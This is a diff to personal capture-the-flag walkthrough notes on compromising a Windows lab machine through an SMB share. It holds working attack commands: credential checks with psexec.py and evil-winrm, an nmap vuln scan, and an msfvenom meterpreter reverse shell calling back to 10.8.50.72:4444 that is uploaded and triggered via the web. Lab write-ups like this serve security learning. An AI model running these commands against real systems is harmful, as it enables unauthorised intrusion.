@@ -12,6 +12,15 @@ after the enumerating we can find out that there is a share named nt4wrksv.  the
 
 we found password.txt in this share. its encoded using base64. lets be there later.
 
+__ check whether users and passwords are valid __
+use psexec.py
+
+[python3 psexec.py 'bob:password@ip']
+
+evil-winrm also can be used. but didn't work in this machine
+
+[evil-winrm --ip ip --user username --password password]
+
 3. run vulnerability scan using nmap script.
 
 [nmap --script vuln -Pn -p ports ip] - -Pn - doesn't check whether ports are exist.
@@ -25,12 +34,17 @@ lets mirror windows server 2016 exploit to current working dir.
 
 [searchsploit -m ]
 
+
 # first step
 
 i went for this step. it seems easy. i created a revese shell using msfvenom and uploaded it to smb share and triggered it using web. 
 creating the reverse shell. 
 
 [msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx]
+
+also pentest.ws site can be used to create the same path to get the reverse shell
+
+[ https://pentest.ws/tools/venom-builder ]
 
 put the shell in shares. 
 [smbclient //ip/sharename] then [put shell.aspx]
@@ -55,3 +69,5 @@ triggering the shell.aspx
 then it will connect to the server. go to the bob desktop. there will be the user flag. 
 
 [cd c:/users/bob/Desktop]
+
+
